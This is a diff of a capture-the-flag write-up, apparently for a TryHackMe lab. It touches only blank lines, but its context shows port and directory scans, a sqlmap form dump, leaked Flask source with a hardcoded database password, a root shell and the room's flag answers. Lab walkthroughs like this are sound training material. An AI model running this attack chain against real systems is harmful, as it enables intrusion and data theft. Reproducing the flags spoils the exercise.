@@ -58,7 +58,6 @@ Good luck,
 
 Billy
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ rustscan -a 10.10.124.107 --ulimit 5500 -b 65535 -- -A -Pn
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -177,8 +176,6 @@ Progress: 4614 / 4615 (99.98%)
 2023/03/12 14:10:16 Finished
 ===============================================================
 
-
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ sqlmap -u http://10.10.124.107/admin --forms --dump
         ___
@@ -229,7 +226,6 @@ it is recommended to perform only basic UNION tests if there is not at least one
 [14:13:14] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/witty/.local/share/sqlmap/output/results-03122023_0212pm.csv'
 
 [*] ending @ 14:13:14 /2023-03-12/
-
 
 ──(witty㉿kali)-[~]
 └─$ gobuster -t 64 dir -e -k -u http://10.10.124.107/ -w /usr/share/dirb/wordlists/common.txt -x php,py
@@ -286,17 +282,14 @@ app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 bcrypt = Bcrypt(app)
 
-
 app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
 eng = create_engine('mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc')
-
 
 # Main Index Route
 @app.route('/', methods=['GET'])
 @app.route('/index', methods=['GET'])
 def index():
     return render_template('index.html', title='Home')
-
 
 # Contact Route
 @app.route('/contact', methods=['GET', 'POST'])
@@ -308,12 +301,10 @@ def contact():
     elif request.method == 'GET':
         return render_template('contact.html', title='Contact')
 
-
 # Products Route
 @app.route('/products', methods=['GET'])
 def products():
     return render_template('products.html', title='Our Products')
-
 
 # Product Route
 # SQL Query performed here
@@ -326,13 +317,11 @@ def product(product_id):
         product_selected = rs.fetchone()  # Returns the entire row in a list
     return render_template('product.html', title=product_selected[1], result=product_selected)
 
-
 # Login
 @app.route('/login', methods=['GET'])
 def login():
     if request.method == 'GET':
         return render_template('login.html', title='Customer Login')
-
 
 # Admin login
 @app.route('/admin', methods=['GET'])
@@ -340,17 +329,14 @@ def admin():
     if request.method == 'GET':
         return render_template('admin.html', title='Admin Login')
 
-
 # Page Not found error handler
 @app.errorhandler(404)
 def page_not_found(e):
     return render_template('404.html', error=e), 404
 
-
 @app.errorhandler(500)
 def internal_server_error(e):
     return render_template('500.html', error=e), 500
-
 
 if __name__ == "__main__":
     app.run('0.0.0.0')
@@ -545,10 +531,8 @@ Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
 
  System information disabled due to load higher than 1.0
 
-
 8 packages can be updated.
 0 updates are security updates.
-
 
 ################################################################################
 #			 Ducky Inc. Web Server 00080012			       #
@@ -845,7 +829,6 @@ sh-4.4# ls /var/www/duckyinc/templates
 sh-4.4# head /var/www/duckyinc/templates/index.html
 {% extends "base.html" %}
 
-
 {% block content %}
 
 <div id="index-banner" class="parallax-container">
@@ -859,11 +842,7 @@ flag3.txt
 sh-4.4# cat /root/flag3.txt 
 thm{m1ss10n_acc0mpl1sh3d}
 
-
 ```
-
-![[Pasted image 20230312132013.png]]
-
 
 flag1
 
@@ -878,6 +857,5 @@ flag3
 Mission objectives
 
 *thm{m1ss10n_acc0mpl1sh3d}*
-
 
 [[HA Joker CTF]]
